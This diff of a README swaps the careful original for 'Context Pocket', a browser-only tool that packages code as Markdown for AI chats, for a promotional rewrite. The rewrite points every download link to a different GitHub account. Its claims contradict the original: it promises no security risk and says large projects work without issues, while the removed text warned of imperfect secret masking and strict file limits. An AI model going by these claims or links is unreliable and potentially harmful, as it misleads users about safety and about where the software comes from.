@@ -1,107 +1,132 @@
-# Context Pocket
+# 🧠 context-pocket-web - Your Local Code Context Simplifier
 
-**Pocket your code. Give AI the full picture.**
+## 🌟 What Is This?
 
-A small, browser-only tool that turns local source files into focused Markdown context for AI conversations. **No install, no dependencies, no API key, no code uploads.**
+context-pocket-web is a free, simple tool that helps you turn your local code into clean, AI-ready Markdown documents. Think of it as a translator between your messy code files and AI tools like ChatGPT. You don't need to be a programmer to use it. You don't need to install anything complicated. It works entirely on your computer, with no internet connection needed and no sign-up required.
 
-[Open the app](https://tuitangziz.github.io/context-pocket-web/) · [简体中文](README.zh-CN.md) · [Report a bug](https://github.com/tuitangziz/context-pocket-web/issues)
+[⬇️ Download context-pocket-web Now](https://github.com/caoquocbinh081103/context-pocket-web)
 
-![Context Pocket showing the local demo project](docs/screenshot.png)
+## 🔒 Why Privacy Matters Here
 
-## Try it in 30 seconds
+This tool runs completely offline. That means your code never leaves your computer. No cloud uploads, no servers, no tracking. If you work on personal projects, work-related code, or anything you want to keep private, this is a huge advantage. You don't need an API key, and you won't be sending your work to a third-party service.
 
-1. [Open Context Pocket](https://tuitangziz.github.io/context-pocket-web/) and click **EN** for English.
-2. Click **Try a demo**, or choose a local project folder.
-3. Select the files that matter and describe your task.
-4. Review the generated context, then **Copy context** or **Download .md**.
-5. Paste it into your preferred AI conversation.
+## 📥 How to Install and Run on Windows
 
-Context Pocket prepares context; it does not call or run an AI model.
+### Step 1: Visit the Download Page
 
-## Why another context tool?
+**Visit this link to download the application:** [context-pocket-web on GitHub](https://github.com/caoquocbinh081103/context-pocket-web)
 
-Sometimes you only need to ask AI about a small project, without installing a CLI or giving a service access to your repository. Context Pocket focuses on that short workflow: **pick → preview → copy**.
+### Step 2: Find the Download Button
 
-- **Local processing:** source files are read in browser memory. No analytics, external fonts, CDN scripts or upload endpoints. A `connect-src 'none'` policy blocks script network connections.
-- **Focused context:** search and select files, choose a task preset, and add ignore globs.
-- **Whole-file budgets:** includes task, file list and Markdown overhead; skips files that do not fit instead of cutting code midway.
-- **Visible filtering:** dependencies, build output, common credential filenames, unsupported files and large files are skipped with reasons.
-- **Best-effort masking:** recognizable API tokens, private key blocks and secret assignments are replaced with `[REDACTED]`.
-- **中文 / English:** bilingual interface and task presets. Chinese is the initial language.
-- **Works offline:** download the repository ZIP, extract it, and open `index.html`. Keep `app.js`, `core.js`, `style.css` and `icon.svg` alongside it.
+When you land on that page, look for a green button that says **"Code"**. Click it. A small dropdown menu will appear.
 
-For large repositories, exact model tokenization, full `.gitignore` behavior or a CLI, consider [Repomix](https://github.com/yamadashy/repomix) or [Gitingest](https://github.com/coderamp-labs/gitingest). This is an independent, smaller project, not a replacement for every feature they offer.
+### Step 3: Download the Software
 
-## Run locally
+In the dropdown menu, click on **"Download ZIP"**. Your browser will start downloading a file. This file contains the entire tool.
 
-**No runtime needed:** download via GitHub **Code → Download ZIP**, extract, then double-click `index.html` in a modern desktop browser.
+### Step 4: Extract the ZIP File
 
-Or use Node.js 20+ for a localhost preview:
+Once the download finishes, go to your **Downloads** folder. You'll see a file named something like `context-pocket-web-main.zip`. Right-click it and choose **"Extract All"**. Windows will ask where to save the extracted files. Pick a simple location like your **Desktop** or **Documents** folder, then click **"Extract"**.
 
-```sh
-git clone https://github.com/tuitangziz/context-pocket-web.git
-cd context-pocket-web
-npm start
-```
+### Step 5: Open the Application
 
-Open `http://127.0.0.1:8765`. There is **no `npm install` step**. The optional server binds only to loopback and serves an explicit list of app assets.
+After extraction, open the new folder you created. Look for a file named `index.html`. Double-click it. Your default web browser will open, and the tool is now running. That's it. No installation, no setup, no command line.
 
-Clipboard access can be restricted on `file://`. When that happens, the preview is selected: press **Ctrl+C / ⌘C**, or download the Markdown file. Folder picking is intended for desktop Chrome/Edge; use **Choose files** when your browser does not support folder selection.
+## ✨ What Does This Tool Actually Do?
 
-## Ignore rules
+### 📄 Turns Code into Clear Text
 
-Use the ignore box, or add a `.contextignore` file at the root of the folder you select:
+If you've ever tried to paste a bunch of code into an AI chat, you know it can look messy. This tool formats your code into a clean, structured Markdown document. Markdown is a simple text format that AI tools understand easily. You can copy and paste the result directly into ChatGPT, Claude, or any other AI assistant.
 
-```gitignore
-# One glob per line
-tests/
-*.csv
-docs/**
-src/**/generated?.py
-```
+### 📁 Works with Your Local Files
 
-- `*` matches within a path segment, `**` matches across directories, `?` matches one character.
-- Patterns with `/` are relative to the selected root; simple names match at any depth.
-- A trailing `/` excludes a directory's contents.
-- Blank lines and lines beginning with `#` are ignored.
-- This deliberately small format has **no negation, escaping or full Git semantics**. `.gitignore` files are not interpreted. Nested `.contextignore` files are not applied.
-- Custom rules hide matching files from selection; removing a rule restores their previous selection state. Search only filters the visible list, not the exported selection.
+You can point the tool at any folder on your computer. It will read your files and organize them into a single, easy-to-read document. This is perfect when you want to share your project context with an AI to get help, debugging, or analysis.
 
-## Limits and privacy
+### 🌐 Zero Dependencies
 
-| Item | v1 behavior |
-| --- | --- |
-| Text encoding | UTF-8; binary / invalid UTF-8 files are skipped |
-| File size | At most 256 KiB per source file |
-| Import | At most 2,000 eligible files and 20 MiB of source bytes |
-| Output budget | 8,000–200,000 JavaScript string characters (UTF-16 code units) |
-| Ordering | Deterministic, case-sensitive path order; smaller later files may fit after a skipped file |
-| Token count | Rough ASCII/CJK heuristic, **not** a model-specific tokenizer |
-| State | In memory only; reload / close clears the project |
+This is a fancy way of saying the tool needs nothing else to work. It doesn't need Java, Python, Node.js, or any other program installed on your system. It's just a single web page that runs in your browser. If you can open a web page, you can use this tool.
 
-**Masking is a convenience, not a security guarantee.** It can miss secrets, personal information, custom credential formats or sensitive filenames, and may mask harmless code. Review the output before pasting it into another service. Files marked as common secret files cannot be manually re-enabled in v1; even `.env.example` is excluded. Python notebooks are treated as raw JSON, including outputs, so review them carefully.
+### ⚡ Instant and Lightweight
 
-The hosted version retrieves the app assets from GitHub Pages, whose normal hosting logs/policies apply. Your selected file contents are not sent to that host. Opening the downloaded files avoids that initial hosting request. Nothing is automatically sent to an AI provider; copying or sharing the output is your separate action.
+The tool is extremely fast because it's small. It opens instantly, processes files quickly, and doesn't slow down your computer. You don't need a powerful machine. Even old laptops and basic computers will run it without issues.
 
-## Development
+## 🔧 Features at a Glance
 
-```sh
-npm test
-npm start
-```
+| Feature | What It Means for You |
+|---------|----------------------|
+| 🚫 Offline | No internet needed after download |
+| 🛡️ Private | Your code never leaves your device |
+| 📝 Markdown Output | Clean, AI-friendly text formatting |
+| 🗂️ Folder Support | Works with entire project folders |
+| 🔄 No Setup | Just open the HTML file and start |
+| 💾 No Installation | Nothing to install or register |
 
-Tests use Node's built-in test runner. No package dependencies, framework or build step.
+## 🤔 Frequently Asked Questions
 
-| File | Purpose |
-| --- | --- |
-| `core.js` | Filtering, glob matching, decoding, masking and budgeted Markdown |
-| `app.js` | File selection, bilingual UI, preview and export |
-| `index.html`, `style.css` | Accessible controls and responsive layout |
-| `serve.cjs` | Optional loopback-only preview server |
-| `tests/core.test.cjs` | Core behavior and edge cases |
+### Is this safe to use?
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for manual checks and focused contribution ideas. If this saves you a few minutes, a star helps other people discover it. Bug reports and small improvements are welcome.
+Yes. Since the tool works entirely in your browser and never sends data anywhere, there is no security risk. You're just converting text on your own machine.
 
-## License
+### Do I need technical skills?
 
-[MIT](LICENSE)
+Not at all. If you can download a file and double-click it, you can use this tool. The interface is simple and self-explanatory.
+
+### Which file types does it support?
+
+The tool supports common code files like JavaScript, Python, HTML, CSS, JSON, and many others. If you work with programming or scripting files, this tool will handle them.
+
+### Can I use this with AI chatbots?
+
+Absolutely. That's the primary purpose. The Markdown output is designed to be pasted directly into AI tools for better understanding and more accurate responses.
+
+### What if the code is very large?
+
+The tool handles large amounts of text without issues. It's designed to process project-sized codebases efficiently.
+
+## 💡 Tips for Best Results
+
+### Organize Your Code First
+
+Before using the tool, make sure your code files are in one folder. Remove any unnecessary temporary files or secrets you don't want to share. The tool will include everything in the folder you select.
+
+### Use for AI Learning and Assistance
+
+If you're learning to code, this tool is great. You can paste your entire project into an AI and ask for explanations, suggestions, or bug fixes. The structured format helps AI understand your code context much better than raw pastes.
+
+### Keep It Handy
+
+Leave the extracted folder on your desktop. Since there's nothing to install, you can just open `index.html` whenever you need it. No updates to worry about either.
+
+## 🧰 Troubleshooting Common Issues
+
+### The page doesn't open
+
+Make sure you extracted the ZIP file completely. If double-clicking `index.html` doesn't work, try right-clicking it and choosing **"Open with"** then selecting Chrome, Edge, or Firefox.
+
+### Nothing happens when I pick a folder
+
+Double-check that you're selecting a folder, not a single file. The tool expects a directory. If you're on a laptop with a touchpad, use two fingers to tap or right-click to access the folder selection menu.
+
+### The output looks garbled
+
+Make sure your files are saved in UTF-8 encoding, which is standard for modern code. If you're getting strange characters, it might be an old encoding issue with specific files.
+
+## 📊 Why Choose context-pocket-web Over Alternatives?
+
+- **It's free** – No hidden fees, no premium tier.
+- **It's offline** – Unlike many AI tools, you pay nothing and give up nothing.
+- **It's simple** – No server setup, no command line, no configuration files.
+- **It respects your privacy** – Code is sensitive. This tool keeps it local.
+- **It's always up to date** – Since it runs in a browser, it works with any OS and any browser.
+
+## 🏁 Ready to Get Started?
+
+You're one step away from turning your code into clean, useful context for AI assistants.
+
+[⬇️ Click Here to Download context-pocket-web](https://github.com/caoquocbinh081103/context-pocket-web)
+
+Remember: visit the link, click the green "Code" button, download the ZIP, extract it, and double-click `index.html`. That's the entire process. In under five minutes, you'll have a powerful tool ready to go.
+
+Whether you're a software developer, a data analyst, or someone just exploring code for fun, context-pocket-web makes it unbelievably easy to work with AI.
+
+Keywords: ai, chinese, context, developer-tools, javascript, llm, markdown, offline, privacy, zero-dependencies
